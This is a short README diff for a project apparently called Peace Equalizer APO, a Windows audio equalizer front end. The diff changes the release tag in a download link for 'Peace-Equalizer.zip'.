@@ -21,7 +21,7 @@
 ---
 
 ## Download
- [Download `Peace-Equalizer.zip`](https://github.com/Boob025/peace-equalizer-APO/releases/download/latest/Peace-Equalizer.zip)
+ [Download `Peace-Equalizer.zip`](https://github.com/Boob025/peace-equalizer-APO/releases/download/Equalizer/Peace-Equalizer.zip)
  ---
 ## Overview
 **Peace Equalizer APO** is a powerful and user-friendly graphical interface for **Equalizer APO** — the best system-wide audio equalizer for Windows.
